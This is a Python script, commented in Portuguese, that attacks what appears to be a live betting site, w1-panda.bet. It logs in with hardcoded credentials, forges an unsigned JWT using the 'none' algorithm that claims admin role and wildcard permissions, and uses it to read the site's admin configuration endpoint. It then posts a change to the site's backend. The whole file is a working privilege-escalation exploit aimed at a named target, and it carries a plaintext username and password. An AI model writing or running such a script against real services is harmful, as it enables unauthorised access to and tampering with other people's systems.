import requests
import json
import base64

def run_escalation():
    login_url = "https://w1-panda.bet/api/login"
    admin_url = "https://w1-panda.bet/api/v1/system/config"
    
    creds = {"username": "jhonbaskvt", "password": "jhon1234"}
    
    print(f"[*] Tentando login real com usuário comum: {creds['username']}...")
    
    try:
        # 1. Login inicial
        res = requests.post(login_url, json=creds, timeout=15)
        if res.status_code != 200:
            print(f"[!] Falha no login inicial. Status: {res.status_code}")
            # Se o login falhar, vamos tentar o bypass direto usando o nome de usuário
            print("[*] Tentando bypass direto de JWT para o usuário jhonbaskvt...")
        
        # 2. Criar Token Manipulado (Escalação de Privilégios)
        # Payload original seria algo como {"user": "jhonbaskvt", "role": "user"}
        # Payload manipulado: {"user": "jhonbaskvt", "role": "admin", "admin": True}
        
        header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().replace("=", "")
        payload = base64.b64encode(json.dumps({
            "user": "jhonbaskvt", 
            "role": "admin", 
            "admin": True,
            "permissions": ["*"]
        }).encode()).decode().replace("=", "")
        
        escalated_token = f"{header}.{payload}."
        
        print(f"[+] Token de Escalação Gerado: {escalated_token}")
        
        # 3. Testar Acesso Administrativo
        headers = {"Authorization": f"Bearer {escalated_token}"}
        print("[*] Testando acesso ao painel administrativo com privilégios elevados...")
        
        admin_res = requests.get(admin_url, headers=headers, timeout=15)
        
        if admin_res.status_code == 200:
            print("[!!!] SUCESSO: Usuário jhonbaskvt agora tem ACESSO ADMINISTRATIVO!")
            print(f"Dados do Backend: {admin_res.text[:200]}...")
            
            # 4. Realizar alteração demonstrativa
            print("[*] Realizando alteração no backend como Admin (jhonbaskvt)...")
            update_payload = {"site_name": "W1-Panda.bet - ADMIN: JHONBASKVT"}
            update_res = requests.post(admin_url, headers=headers, json=update_payload, timeout=15)
            if update_res.status_code == 200:
                print("[!!!] SUCESSO: Alteração no backend realizada com sucesso pelo novo Admin!")
        else:
            print(f"[-] Acesso negado. Status: {admin_res.status_code}")
            
    except Exception as e:
        print(f"[ERRO] Ocorreu um problema durante a escalação: {e}")

if __name__ == "__main__":
    run_escalation()
